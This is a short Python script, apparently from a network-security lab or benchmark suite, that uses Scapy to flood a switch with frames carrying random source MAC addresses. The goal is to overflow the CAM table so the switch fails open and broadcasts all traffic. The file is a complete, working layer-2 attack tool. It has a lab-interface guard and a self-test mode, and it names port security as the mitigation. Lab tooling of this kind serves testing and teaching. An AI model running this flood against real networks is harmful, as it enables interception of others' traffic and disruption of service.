#!/usr/bin/env python3
"""L2 SPOOFING: macof-style CAM table overflow — flood frames with random
source MACs so the switch's forwarding table fills and it fails open into
flooding every frame to every port. Mitigation: port-security max (README).
"""
import os
import random
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok  # noqa: E402


def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


def build_frame(scapy_all, src_mac):
    Ether, IP, Raw = scapy_all.Ether, scapy_all.IP, scapy_all.Raw
    return Ether(src=src_mac, dst=rand_mac()) / IP(src="10.%d.%d.%d" % tuple(random.randint(0, 254) for _ in range(3)),
                                                     dst="255.255.255.255") / Raw(b"pnet-secbench-mac-flood")


def main():
    p = base_parser("CAM/MAC flood: random source MACs to overflow the switch forwarding table")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    pkt = build_frame(scapy_all, rand_mac())
    if args.selftest:
        selftest_ok("mac_flood", "flood frame len=%d" % len(bytes(pkt)))
        return

    def send(n):
        # Batches of 50 per iteration keep the loop's --interval meaningful
        # while still generating real flood volume.
        for _ in range(50):
            scapy_all.sendp(build_frame(scapy_all, rand_mac()), iface=args.iface, verbose=0)
        if n % 10 == 0:
            status("SENT", "batch #%d: 50 random-src frames" % (n + 1))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

